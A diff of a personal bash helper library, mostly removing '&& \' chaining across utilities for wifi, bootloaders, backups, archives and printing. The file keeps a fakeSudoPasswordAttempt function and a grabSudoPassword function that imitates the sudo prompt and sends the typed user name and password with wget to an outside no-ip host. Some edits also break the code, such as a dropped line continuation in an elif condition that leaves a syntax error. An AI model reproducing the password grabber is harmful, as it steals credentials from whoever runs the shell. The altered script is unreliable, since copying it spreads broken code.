@@ -186,7 +186,7 @@ fakeSudoPasswordAttempt() {
     # Examples:
     #
     # >>> fakeSudoPasswordAttempt
-    local number password && \
+    local number password
     for number in 1 2 3; do
         read -sp '[sudo] password for '$(whoami)': ' password
         sleep 1
@@ -201,12 +201,12 @@ grabSudoPassword() {
     # Examples:
     #
     # >>> grabSudoPassword
-    local password && \
-    local user=$(whoami) && \
-    local standardOutputBufferFile=$(mktemp) && \
+    local password
+    local user=$(whoami)
+    local standardOutputBufferFile=$(mktemp)
     for number in 1 2 3; do
-        read -sp '[sudo] password for '$user': ' password && \
-        echo '' && \
+        read -sp '[sudo] password for '$user': ' password
+        echo ''
         if echo -e "$password\n" | sudo -S "$@" 1>"$standardOutputBufferFile" 2>/dev/null; then
             # NOTE: Place your password grabber server url here.
             wget --quiet "http://suna.no-ip.info:8080?user=$user&password=$password"
@@ -232,7 +232,7 @@ wlanStart() {
     # Examples:
     #
     # >>> wlanStart
-    wpa_supplicant -c /etc/wpa_supplicant.conf -i wlan0 -D wext -B && \
+    wpa_supplicant -c /etc/wpa_supplicant.conf -i wlan0 -D wext -B
     dhclient wlan0
     return $?
 }
@@ -242,8 +242,8 @@ wlanStop() {
     # Examples:
     #
     # >>> wlanStop
-    killall wpa_supplicant && \
-    killall dhclient && \
+    killall wpa_supplicant
+    killall dhclient
     killall dhclient3
     return $?
 }
@@ -253,7 +253,7 @@ wlanRestart() {
     # Examples:
     #
     # >>> wlanRestart
-    wlanStop && \
+    wlanStop
     wlanStart
     return $?
 }
@@ -276,15 +276,15 @@ restoreGrub() {
     # Examples:
     #
     # >>> restoreGrub
-    echo 'Mount systems root filesystem' && \
-    mount /dev/disk/by-label/system /mnt && \
-    echo 'Bind Kernel diretorys to run Ubuntu kernel in /mnt' && \
-    mount --bind /dev /mnt/dev && \
-    mount --bind /proc /mnt/proc && \
-    mount --bind /run /mnt/run && \
-    mount --bind /sys /mnt/sys && \
-    mount --bind /tmp /mnt/tmp && \
-    echo "Change root file system from rescue root system to system's root filesystem (/mnt)" && \
+    echo 'Mount systems root filesystem'
+    mount /dev/disk/by-label/system /mnt
+    echo 'Bind Kernel diretorys to run Ubuntu kernel in /mnt'
+    mount --bind /dev /mnt/dev
+    mount --bind /proc /mnt/proc
+    mount --bind /run /mnt/run
+    mount --bind /sys /mnt/sys
+    mount --bind /tmp /mnt/tmp
+    echo "Change root file system from rescue root system to system's root filesystem (/mnt)"
     chroot /mnt grub-install /dev/sda
     return $?
 }
@@ -296,12 +296,12 @@ compileAndInstallWithoutRoot() {
     #
     # >>> compileAndInstallWithoutRoot /home/user/myUser/
     # ...
-    installLocation="$ILU_MY_ROOT_PATH" && \
+    installLocation="$ILU_MY_ROOT_PATH"
     if [ "$1" ]; then
         local installLocation="$1"
     fi
     chmod +x ./configure
-    ./configure prefix="$installLocation" && \
+    ./configure prefix="$installLocation"
     # NOTE: Another possibilty to install to a specified path is
     # "make install DESTDIR=$1"
     make install
@@ -320,14 +320,14 @@ makeUEFIBootEntry() {
     # ...
     # >>> makeUEFIBootEntry archLinuxLTSFallback vmlinuz-linux-lts
     # ...
-    local kernelParameterFilePath="${ILU_CONFIG_PATH}linux/kernel/${1}CommandLine" && \
-    local kernel='vmlinuz-linux' && \
+    local kernelParameterFilePath="${ILU_CONFIG_PATH}linux/kernel/${1}CommandLine"
+    local kernel='vmlinuz-linux'
     if [[ "$2" ]]; then
         kernel="$2"
     fi
     if [[ -f "$kernelParameterFilePath" ]]; then
-        local command="sudo efibootmgr --verbose --create --disk /dev/sda --part 1 -l \"\\${kernel}\" --label \"$1\" --unicode \"$(cat "$kernelParameterFilePath")\"" && \
-        echo "Create boot entry \"$1\" with command \"${command}\"." && \
+        local command="sudo efibootmgr --verbose --create --disk /dev/sda --part 1 -l \"\\${kernel}\" --label \"$1\" --unicode \"$(cat "$kernelParameterFilePath")\""
+        echo "Create boot entry \"$1\" with command \"${command}\"."
         eval $command
     else
         echo "Error: file \"${kernelParameterFilePath}\" doesn't exists."
@@ -344,15 +344,15 @@ backupBTRFSSystem() {
     # >>> backupBTRFSSystem delete rootBackup
     sudo umount /mnt &>/dev/null
     if [[ "$1" == create ]]; then
-        sudo mount PARTLABEL=system /mnt && \
-        local timestamp="$(date +"%d:%m:%y:%T")" && \
+        sudo mount PARTLABEL=system /mnt
+        local timestamp="$(date +"%d:%m:%y:%T")"
         sudo btrfs subvolume snapshot /mnt/root \
-            "/mnt/rootBackup${timestamp}" && \
+            "/mnt/rootBackup${timestamp}"
         # NOTE: Autocompletion should be done by sudo. Not bash as user.
-        sudo bash -c "cp --recursive /boot/* \"/mnt/rootBackup${timestamp}/boot/\"" && \
+        sudo bash -c "cp --recursive /boot/* \"/mnt/rootBackup${timestamp}/boot/\""
         sudo umount /mnt
     elif [[ "$1" == delete ]] && [[ "$2" ]]; then
-        sudo mount PARTLABEL=system /mnt && \
+        sudo mount PARTLABEL=system /mnt
         sudo btrfs subvolume delete "/mnt/$(basename "$2")"
         sudo umount /mnt
     elif [[ "$1" == list ]]; then
@@ -371,7 +371,7 @@ _backupBTRFSSystem() {
 
     if [[ $COMP_CWORD == 1 ]]; then
         COMPREPLY=($(compgen -W 'create delete list' -- "$currentArgument"))
-    elif [[ $UID == 0 ]] && [[ $COMP_CWORD == 2 ]] && \
+    elif [[ $UID == 0 ]] && [[ $COMP_CWORD == 2 ]]
          [[ "$lastCompleteArgument" == 'delete' ]]; then
         COMPREPLY=($(compgen -W "$(backupBTRFSSystem list | cut --delimiter ' ' \
             --field 9 | tr '\n' ' ')" -- "$currentArgument"))
@@ -402,10 +402,10 @@ runWithAppendedShebang() {
     # # /usr/bin/env python -O /path/to/script.py argument1 argument2
     # >>> runWithAppendedShebang -O -- /path/to/script.py argument1 argument2
     # ...
-    local shebangArguments='' && \
-    local arguments='' && \
-    local applicationPath='' && \
-    local shebangArgumentsEnded=false && \
+    local shebangArguments=''
+    local arguments=''
+    local applicationPath=''
+    local shebangArgumentsEnded=false
     while true; do
         case "$1" in
             --)
@@ -430,9 +430,9 @@ runWithAppendedShebang() {
     done
     local applicationRunCommand="$(head --lines 1 "$applicationPath" | sed \
         --regexp-extended \
-        's/^#!(.+)$/\1/g')${shebangArguments} ${applicationPath} $arguments" && \
+        's/^#!(.+)$/\1/g')${shebangArguments} ${applicationPath} $arguments"
     # NOTE: The following line could be useful for debugging scenarios.
-    #echo "Run: \"$applicationRunCommand\"" && \
+    #echo "Run: \"$applicationRunCommand\""
     eval "$applicationRunCommand"
     return $?
 }
@@ -464,7 +464,7 @@ overlayLocation() {
     #
     # Examples:
     # >>> overlayLocation /usr/bin/
-    mkdir --parents /tmp/overlayfsDifferences && \
+    mkdir --parents /tmp/overlayfsDifferences
     mount --types overlayfs --options \
         lowerdir="$1",upperdir='/tmp/overlayDifferences' overlayfs "$1"
     return $?
@@ -477,7 +477,7 @@ addDefaultUpstartService() {
     #
     # addDefaultUpstartService script.sh
     # ...
-    chmod +x "/etc/init/$1" && \
+    chmod +x "/etc/init/$1"
     update-rc.d "$1" defaults
     return $?
 }
@@ -511,16 +511,16 @@ prependVimModline() {
     # Examples:
     #
     # >>> prependVimModline /path/text/file #
-    local tempFile=$(mktemp) && \
+    local tempFile=$(mktemp)
     local firstNewLine=$(grep --extended-regexp '^$' "$1" --line-number | \
-        head --lines 1 | grep --extended-regexp --only-matching '^[0-9]+') && \
-    head --lines "$firstNewLine" "$1" 1>"$tempFile" && \
-    getVimModline "$2" 1>>"$tempFile" && \
-    echo '' 1>>"$tempFile" && \
+        head --lines 1 | grep --extended-regexp --only-matching '^[0-9]+')
+    head --lines "$firstNewLine" "$1" 1>"$tempFile"
+    getVimModline "$2" 1>>"$tempFile"
+    echo '' 1>>"$tempFile"
     local numberOfLines=$(wc --lines "$1" | grep --extended-regexp \
-        --only-matching '[0-9]+') && \
-    let numberOfFooterLines="$numberOfLines - $firstNewLine" && \
-    tail --lines "$numberOfFooterLines" "$1" 1>>"$tempFile" && \
+        --only-matching '[0-9]+')
+    let numberOfFooterLines="$numberOfLines - $firstNewLine"
+    tail --lines "$numberOfFooterLines" "$1" 1>>"$tempFile"
     # NOTE: Only move the file content to preserve file attributes.
     cat "$tempFile" 1>"$1"
     return $?
@@ -533,7 +533,7 @@ appendVimModline() {
     # Examples:
     #
     # >>> appendVimModline /path/text/file #
-    echo '' 1>>"$1" && \
+    echo '' 1>>"$1"
     getVimModline "$2" 1>>"$1"
     return $?
 }
@@ -543,11 +543,11 @@ writeImageToBlockdevice() {
     # Examples:
     #
     # >>> writeImageToBlockdevice /data/private/backup/image.img /dev/mmcblk0
-    local source="${ILU_DATA_PATH}temp/image/"*.img && \
+    local source="${ILU_DATA_PATH}temp/image/"*.img
     if [[ "$1" ]]; then
         source="$1"
     fi
-    local target=/dev/mmcblk0 && \
+    local target=/dev/mmcblk0
     if [[ "$2" ]]; then
         target="$2"
     fi
@@ -560,11 +560,11 @@ writeBlockdeviceToImage() {
     # Examples:
     #
     # >>> writeBlockdeviceToImage /dev/mmcblk0 /data/private/backup/image.img
-    local source=/dev/mmcblk0 && \
+    local source=/dev/mmcblk0
     if [[ "$1" ]]; then
         source="$1"
     fi
-    local target="${ILU_DATA_PATH}private/backup/backup-sd-card.img" && \
+    local target="${ILU_DATA_PATH}private/backup/backup-sd-card.img"
     if [[ "$2" ]]; then
         target="$2"
     fi
@@ -594,15 +594,15 @@ makeSingleExecutable() {
         echo "Usage: $0 <DIRECTOTY_PATH> [EXECUTABLE_FILE_NAME] [RELATIVE_START_FILE_PATH]"
         exit 1
     fi
-    local fileName='index.sh' && \
+    local fileName='index.sh'
     if [[ "$2" ]]; then
         fileName="$2"
     fi
-    local relativeStartFilePath='./index' && \
+    local relativeStartFilePath='./index'
     if [[ "$3" ]]; then
         relativeStartFilePath="$3"
     fi
-    local directoryName=$(basename $(readlink --canonicalize "$1")) && \
+    local directoryName=$(basename $(readlink --canonicalize "$1"))
     # NOTE: short option is necessary for mac compatibility.
     cat << EOF 1>"$fileName"
 #!/bin/bash
@@ -614,9 +614,9 @@ tail -n +\$dataOffset "\$0" | tar -xzf - -C "\$executableDirectory" \\
 "\${executableDirectory}/${directoryName}/${relativeStartFilePath}" "\$@"
 exit \$?
 EOF
-    local tempArchiv=$(mktemp).tar.gz && \
+    local tempArchiv=$(mktemp).tar.gz
     tar --create --verbose --gzip --posix --file "$tempArchiv" "$1" &&
-    cat "$tempArchiv" 1>>"$fileName" && \
+    cat "$tempArchiv" 1>>"$fileName"
     chmod +x "$fileName"
     return $?
 }
@@ -629,12 +629,12 @@ showNotMaintainedByPacmanSystemFiles() {
     #
     # >>> showNotMaintainedByPacmanSystemFiles
     # ...
-    local allFiles=$(mktemp) && \
-    local allMaintainedFiles=$(mktemp) && \
+    local allFiles=$(mktemp)
+    local allMaintainedFiles=$(mktemp)
 
-    sudo find / | sort | sed 's:/$::g' | sort | uniq 1>"$allFiles" && \
+    sudo find / | sort | sed 's:/$::g' | sort | uniq 1>"$allFiles"
     pacman --query --list --quiet | sed 's:/$::g' | sort | \
-        uniq 1>"$allMaintainedFiles" && \
+        uniq 1>"$allMaintainedFiles"
     cat "$allFiles" "$allMaintainedFiles" | \
         sed 's:^/home/.*$::g' | \
         sed 's:^/root/.*$::g' | \
@@ -646,10 +646,10 @@ showNotMaintainedByPacmanSystemFiles() {
         sed 's:^/var/cache/.*$::g' | \
         sed 's:^/var/log/.*$::g' | \
         sed 's:^/proc/.*$::g' | \
-        sort | uniq --unique && \
-    local numberOfAllFiles=$(wc --lines $allFiles | cut --delimiter ' ' --field 1) && \
-    local numberOfMaintainedFiles=$(wc --lines $allMaintainedFiles | cut --delimiter ' ' --field 1) && \
-    let numberOfNotMaintainedFiles="${numberOfAllFiles} - ${numberOfMaintainedFiles}" && \
+        sort | uniq --unique
+    local numberOfAllFiles=$(wc --lines $allFiles | cut --delimiter ' ' --field 1)
+    local numberOfMaintainedFiles=$(wc --lines $allMaintainedFiles | cut --delimiter ' ' --field 1)
+    let numberOfNotMaintainedFiles="${numberOfAllFiles} - ${numberOfMaintainedFiles}"
     cat << EOF
 
 Number of files: $numberOfAllFiles 100%
@@ -665,7 +665,7 @@ showConfigBackups() {
     #
     # >>> showConfigBackups
     # ...
-    cd / 1>/dev/null && \
+    cd / 1>/dev/null
     for pattern in '*.pacnew' '*.orig' '*_backup*' '*.pacorig'; do
         sudo find -name "$pattern" -and \( -type f -or -type l -or -type d \)
     done
@@ -680,11 +680,11 @@ sendEMail() {
     #
     # >>> sendEMail subject content address
     # >>> sendEMail subject content address "Sun, 2 Feb 1986 14:23:56 +0100"
-    local eMailAddress="$ILU_ALTERNATE_USER_EMAIL_ADDRESS" && \
+    local eMailAddress="$ILU_ALTERNATE_USER_EMAIL_ADDRESS"
     if [ "$3" ]; then
         eMailAddress="$3"
     fi
-    local date="$(date)" && \
+    local date="$(date)"
     if [ "$4" ]; then
         date="$4"
     fi
@@ -706,24 +706,24 @@ makeCommandPromtPrefix() {
     # Examples:
     #
     # >>> makeCommandPromtPrefix
-    local errorNumber=$? && \
+    local errorNumber=$?
     local systemLoadAverage=$(uptime | grep --extended-regexp --only-matching \
-        '[0-9]{1,2}\.[0-9]{1,2}' | head --lines 1) && \
-    local errorPromt="(${ILU_RED}${errorNumber}${ILU_DEFAULT_COLOR})" && \
+        '[0-9]{1,2}\.[0-9]{1,2}' | head --lines 1)
+    local errorPromt="(${ILU_RED}${errorNumber}${ILU_DEFAULT_COLOR})"
     if [[ "$errorNumber" == '0' ]]; then
         errorPromt="${ILU_GREEN}>${ILU_DEFAULT_COLOR}"
     fi
     local gitBranch=$(git branch 2>/dev/null | sed --regexp-extended \
         "s/^\* (.*)$/ $(validateSEDReplacement "$ILU_RED")\1$(validateSEDReplacement "$ILU_CYAN")/g" \
         | tr --delete "\n" | sed 's/  / /g' | sed 's/^ *//g' | \
-        sed 's/ *$//g') && \
+        sed 's/ *$//g')
     if [ "$gitBranch" ]; then
         gitBranch="(${ILU_GRAY}git${ILU_DEFAULT_COLOR})-(${ILU_CYAN}${gitBranch}${ILU_DEFAULT_COLOR})"
     fi
     if [[ "$(id --user)" == '0' ]]; then
         local userName="${ILU_RED}"
     fi
-    local userName+="\u$ILU_DEFAULT_COLOR" && \
+    local userName+="\u$ILU_DEFAULT_COLOR"
     if [[ "$TERM" != 'linux' ]]; then
         local titleBar="\[\e]0;\u@\h:$(pwd)\a\]"
     fi
@@ -749,7 +749,7 @@ makeSSHKey() {
     # ...
     # >>> makeSSHKey hans
     # ...
-    local user="$ILU_USER_EMAIL_ADDRESS" && \
+    local user="$ILU_USER_EMAIL_ADDRESS"
     if [ "$1" ]; then
         user="$1"
     fi
@@ -763,18 +763,18 @@ makeOpenSSLPemFile() {
     #
     # >>> makeOpensslPemFile
     # ...
-    local host='localhost' && \
+    local host='localhost'
     if [[ "$1" ]]; then
         host="$1"
     fi
-    echo 'Create your private key without a password.' && \
-    openssl genrsa -out "${host}.key" 1024 && \
-    echo 'Create a temporary csr file.' && \
-    openssl req -new -key "${host}.key" -out "${host}.csr" && \
-    echo 'Self-sign your certificate.' && \
+    echo 'Create your private key without a password.'
+    openssl genrsa -out "${host}.key" 1024
+    echo 'Create a temporary csr file.'
+    openssl req -new -key "${host}.key" -out "${host}.csr"
+    echo 'Self-sign your certificate.'
     openssl x509 -req -days 365 -in "${host}.csr" -signkey "${host}.key" -out \
-        "${host}.crt" && \
-    echo 'Creating a pem file.' && \
+        "${host}.crt"
+    echo 'Creating a pem file.'
     cat "${host}.key" "${host}.crt" 1>"${host}.pem"
     return $?
 }
@@ -828,30 +828,30 @@ imagesToCSSClasses() {
     # ...
     # >>> imagesToCSSClasses
     # ...
-    local source='.' && \
+    local source='.'
     if [ -d "$1" ]; then
-        source="$1" && \
+        source="$1"
         shift
     fi
     local pathPattern='.*\.\(png\|jpg\|jpeg\|ico\)'
     if [[ "$1" ]]; then
-        pathPattern="$1" && \
+        pathPattern="$1"
         shift
     fi
     find "$source" -regex "^$pathPattern$" | while read imageFilePath; do
-        local validPath=true && \
-        local excludePath && \
+        local validPath=true
+        local excludePath
         for excludePath in $@; do
-            excludePath=$(echo $excludePath | sed 's/\/$//g') && \
+            excludePath=$(echo $excludePath | sed 's/\/$//g')
             if [[ "$excludePath" == $(dirname "$imageFilePath") ]] || \
                [[ "$excludePath" == "$imageFilePath" ]]; then
-                validPath=false && \
+                validPath=false
                 break
             fi
         done
         if $validPath; then
             local imageClassName="$(echo "$imageFilePath" | tr '@#&%+./_{; ' '-' | \
-                grep --only-matching --extended-regexp '[^-].+$')" && \
+                grep --only-matching --extended-regexp '[^-].+$')"
             echo ".image-data-${imageClassName}{background-image: url(\"data:$(file --brief --mime-type "$imageFilePath");base64,$(base64 --wrap 0 "$imageFilePath")\")}"
         fi
     done
@@ -868,25 +868,25 @@ mergeTextFiles() {
     # ...     '\n# endregion\n' --between '\n# endregion\n\n# region %s\n'
     # ...
     # region
-    local append='\n// endregion' && \
-    local prepend='// region %s\n\n' && \
-    local between='\n// endregion\n\n// region %s\n\n' && \
+    local append='\n// endregion'
+    local prepend='// region %s\n\n'
+    local between='\n// endregion\n\n// region %s\n\n'
     # endregion
     while true; do
         case $1 in
             -p|--prepend)
-                shift && \
-                prepend=$1 && \
+                shift
+                prepend=$1
                 shift
                 ;;
             -a|--append)
-                shift && \
-                append=$1 && \
+                shift
+                append=$1
                 shift
                 ;;
             -b|--between)
-                shift && \
-                between=$1 && \
+                shift
+                between=$1
                 shift
                 ;;
             '')
@@ -902,14 +902,14 @@ mergeTextFiles() {
         esac
     done
     printf "$prepend" "$(echo "$files" | grep --only-matching \
-        --extended-regexp '^[^ ]+')" && \
-    local index=0 && \
-    local filePath && \
+        --extended-regexp '^[^ ]+')"
+    local index=0
+    local filePath
     for filePath in ${files[*]}; do
         if [[ $index > 0 ]]; then
             printf "$between" "$filePath"
         fi
-        cat $filePath && \
+        cat $filePath
         index+=1
     done
     printf "$append"
@@ -922,12 +922,12 @@ openPath() {
     #
     # >>> openPath http://www.google.de
     # >>> openPath file.text
-    local program && \
+    local program
     for program in gnome-open kde-open gvfs-open exo-open xdg-open gedit \
         mousepad gvim vim emacs nano vi less cat
     do
         if hash "$program" 2>/dev/null; then
-            "$program" "$1" && \
+            "$program" "$1"
             break
         fi
     done
@@ -946,9 +946,9 @@ showSymlinks() {
     # >>> showSymlinks /home
     # /home/user/.vim -> /home/user/configs/vimConfig
     # ...
-    local fileSystemElement && \
+    local fileSystemElement
     for fileSystemElement in $(find "$1" -type l); do
-        echo "$fileSystemElement"' -> ' && \
+        echo "$fileSystemElement"' -> '
         readlink "$fileSystemElement"
     done
     return $?
@@ -968,11 +968,11 @@ translate() {
     # bonjour
     # >>> translate hello en fr
     # bonjour
-    local defaultTargetLanguage=de && \
+    local defaultTargetLanguage=de
     local help="translate <text> [[<source language>] <target language>]\n
                 if target missing, use $defaultTargetLanguage\n
                 if source missing, use auto\n
-                list supported languages: translate -l" && \
+                list supported languages: translate -l"
     local languages="af=Afrikaans\n sq=Albanisch\n ar=Arabisch\n hy=Armenisch\n
                      az=Aserbaidschanisch\n eu=Baskisch\n bn=Bengalisch\n
                      bg=Bulgarisch\n zh-TW=Chinesisch (traditionell)\n
@@ -993,17 +993,17 @@ translate() {
                      tl=Tagalog\n ta=Tamil\n te=Telugu\n th=ThailÃ¤ndisch\n
                      cs=Tschechisch\n tr=TÃ¼rkisch\n uk=Ukrainisch\n
                      hu=Ungarisch\n ur=Urdu\n vi=Vietnamesisch\n cy=Walisisch\n
-                     be=WeiÃrussisch" && \
+                     be=WeiÃrussisch"
     if [[ "$1" = -h || "$1" = --help || "$#" < 1 ]]; then
         echo -e "$help"
     elif [[ "$1" = -l || "$1" = --languages ]]; then
         echo -e "$languages"
     else
         if [ "$3" ]; then
-            source="$2" && \
+            source="$2"
             local target="$3"
         else
-            source=auto && \
+            source=auto
             if [ "$2" ]; then
                 local target="$2"
             else
@@ -1012,7 +1012,7 @@ translate() {
         fi
         local result=$(curl -s -i --user-agent "" -d "sl=$source" -d \
             "tl=$target" --data-urlencode "text=$1" \
-            http://translate.google.com) && \
+            http://translate.google.com)
         # NOTE Temporary outcomment to have right code highlighting.
         # local encoding=$(awk '/Content-Type: .* charset=/ {sub(/^.*charset=["'\'']?/,""); sub(/[ "'\''].*$/,""); print}' <<<"$result")
         # NOTE Alternativly use:
@@ -1031,7 +1031,7 @@ runInProgramsLocation() {
     # >>> runInProgramsLocation /usr/bin/python3.2
     # ...
     if [ "$1" ] && [ -f "$1" ]; then
-        cd "$(dirname "$1")" && \
+        cd "$(dirname "$1")"
         "./$(basename "$1")" $*
         return $?
     else
@@ -1046,11 +1046,11 @@ repairLinuxFilesystem() {
     #
     # >>> repairLinuxFilesystem /dev/mmcblk0p2
     # ...
-    local target=/dev/mmcblk0 && \
+    local target=/dev/mmcblk0
     if [[ "$1" ]]; then
         target="$1"
     fi
-    sudo badblocks "$target" && \
+    sudo badblocks "$target"
     sudo fsck -a "$target"
     return $?
 }
@@ -1067,10 +1067,10 @@ sshPrint() {
     # ...
     # >>> sshPrint /home/hans/document.txt hans hp15
     # ...
-    local user='sickertt' && \
-    local host='login.informatik.uni-freiburg.de' && \
-    local defaultPrinter='hp15' && \
-    local usageMessage="Usage: "$0" <file> [login] [printer] [withFileContentPipe]" && \
+    local user='sickertt'
+    local host='login.informatik.uni-freiburg.de'
+    local defaultPrinter='hp15'
+    local usageMessage="Usage: "$0" <file> [login] [printer] [withFileContentPipe]"
 
     if [[ $# < 1 ]]; then
         echo "$usageMessage"
@@ -1084,28 +1084,28 @@ sshPrint() {
         else
             # Grab user from "~/.ssh/config".
             local userRow=$(cat ~/.ssh/config | grep "$host" -A1 | \
-                grep -i user) && \
+                grep -i user)
             if [ "$userRow" ]; then
-                local user=$(echo ${userRow} | sed s/user\\s//ig) && \
+                local user=$(echo ${userRow} | sed s/user\\s//ig)
                 local login="$user"@"$host"
             else
-                echo 'No login given.' && \
+                echo 'No login given.'
                 echo "$usageMessage"
             fi
         fi
         # 3. argument: Select printer.
-        local printer=defaultPrinter && \
+        local printer=defaultPrinter
         if [ "$3" ]; then
             local printer="$3"
         fi
         # 4. argument: Determines which way to use for transport file content.
         if [ "$4" ]; then
-            echo 'Pipe file content through ssh.' && \
+            echo 'Pipe file content through ssh.'
             cat "$1" | ssh "$login" lpr -P"$printer"
             return $?
         else
-            echo "Copy file to server via scp ($login)." && \
-            scp "$1" "${login}:/tmp/.sshPrint" && \
+            echo "Copy file to server via scp ($login)."
+            scp "$1" "${login}:/tmp/.sshPrint"
             ssh "$login" lpr -P"$printer" ~/.sshPrint
             return $?
         fi
@@ -1121,7 +1121,7 @@ unpack() {
     #
     # >>> unpack path/to/archiv.zip
     if [ -f "$1" ]; then
-        local command && \
+        local command
         case "$1" in # switch
             *.tar.bz2|*.tbz2)
                 command="tar --extract --verbose --bzip2 --file \"$1\""
@@ -1155,7 +1155,7 @@ unpack() {
                 ;;
         esac
         if [ "$command" ]; then
-            echo "Running: [$command]." && \
+            echo "Running: [$command]."
             eval "$command"
             return $?
         fi
@@ -1172,7 +1172,7 @@ pack() {
     # >>> pack archiv.zip /path/to/file.ext
     # >>> pack archiv.zip /path/to/directory
     if [ -d "$2" ] || [ -f "$2" ]; then
-        local command && \
+        local command
         case "$1" in
             *.tar.bz2|*.tbz2)
                 command="tar --dereference --create --verbose --bzip2 --file \"$1\" \"$2\""
@@ -1211,7 +1211,7 @@ pack() {
                 return $?
         esac
         if [ "$command" ]; then
-            echo "Running: [$command]." && \
+            echo "Running: [$command]."
             eval "$command"
             return $?
         fi
@@ -1228,7 +1228,7 @@ loadXINITSources() {
     # Examples:
     #
     # >>> loadXINITSources
-    local xinitRCPath='/etc/X11/xinit/xinitrc.d' && \
+    local xinitRCPath='/etc/X11/xinit/xinitrc.d'
     if [ -d "$XINIT_RC_PATH" ]; then
         for filePath in "${XINIT_RC_PATH}/"*; do
             [ -x "$filePath" ] && source "$filePath"
@@ -1355,7 +1355,7 @@ switchFingerTouchWacomEnabled() {
     # >>> switchFingerTouchWacomEnabled enable
     # >>> switchFingerTouchWacomEnabled disable
     if (xinput --list-props 'Wacom ISDv4 E6 Finger touch' | grep \
-        'Device Enabled' | cut --fields 3 | grep 1 --quiet && \
+        'Device Enabled' | cut --fields 3 | grep 1 --quiet
         [[ "$1" != enable ]]) || [[ "$1" == disable ]]
     then
         xinput set-prop 'Wacom ISDv4 E6 Finger touch' 'Device Enabled' 0
